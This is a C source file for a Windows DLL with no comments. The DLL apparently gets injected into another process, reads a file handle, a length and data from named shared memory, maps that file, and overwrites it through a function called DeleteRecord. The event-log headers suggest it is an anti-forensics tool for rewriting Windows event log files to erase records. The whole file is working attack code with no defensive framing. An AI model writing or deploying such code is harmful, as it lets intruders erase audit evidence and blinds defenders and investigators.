#include <windows.h>
#include <stdio.h>
#include <winevt.h>
#pragma comment(lib,"wevtapi.lib")

#define BUF_SIZE 256

PVOID DeleteRecord(PVOID mapAddress,char *buf,int len)
{
	memcpy(mapAddress, buf, len);
	return mapAddress;
}

BOOL WINAPI DllMain(HMODULE instance, DWORD reason, PVOID reserve)
{
	PVOID mapAddress = NULL;
	HANDLE mapHandle = NULL;
	HANDLE fileHandle = NULL;
	HANDLE hMapFile1, hMapFile2, hMapFile3;
	char *pBuf1;
	char *pBuf2;
	char *pBuf3;
	TCHAR szName1[] = L"Global\\SharedMappingObject1";
	TCHAR szName2[] = L"Global\\SharedMappingObject2";
	TCHAR szName3[] = L"Global\\SharedMappingObject3";
	int offset = 0;
	int len = 0;

	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		hMapFile1 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName1);
		if (hMapFile1 == NULL)
			return 1;
		pBuf1 = (char *)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
		if (pBuf1 == NULL)
		{
			CloseHandle(hMapFile1);
			return 1;
		}
		sscanf_s(pBuf1, "%d", &offset);
		UnmapViewOfFile(pBuf1);
		CloseHandle(hMapFile1);

		hMapFile2 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName2);
		if (hMapFile2 == NULL)
			return 1;
		pBuf2 = (char *)MapViewOfFile(hMapFile2, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
		if (pBuf2 == NULL)
		{
			CloseHandle(hMapFile2);
			return 1;
		}
		sscanf_s(pBuf2, "%d", &len);
		UnmapViewOfFile(pBuf2);
		CloseHandle(hMapFile2);


		hMapFile3 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName3);
		if (hMapFile3 == NULL)
			return 1;
		pBuf3 = (char *)MapViewOfFile(hMapFile3, FILE_MAP_ALL_ACCESS, 0, 0, len);
		if (pBuf3 == NULL)
		{
			CloseHandle(hMapFile3);
			return 1;
		}
		CloseHandle(hMapFile3);

		fileHandle = (void*)offset;
		mapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
		if (!mapHandle)
		{
			UnmapViewOfFile(pBuf3);
			break;
		}
		mapAddress = MapViewOfFile(mapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (!mapAddress)
		{
			CloseHandle(mapHandle);
			UnmapViewOfFile(pBuf3);
			break;
		}
		
		mapAddress = DeleteRecord(mapAddress, pBuf3,len);

		FlushViewOfFile(mapAddress, 0);
		UnmapViewOfFile(pBuf3);
		if (mapAddress)
			UnmapViewOfFile(mapAddress);
		if (mapHandle)
			CloseHandle(mapHandle);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}
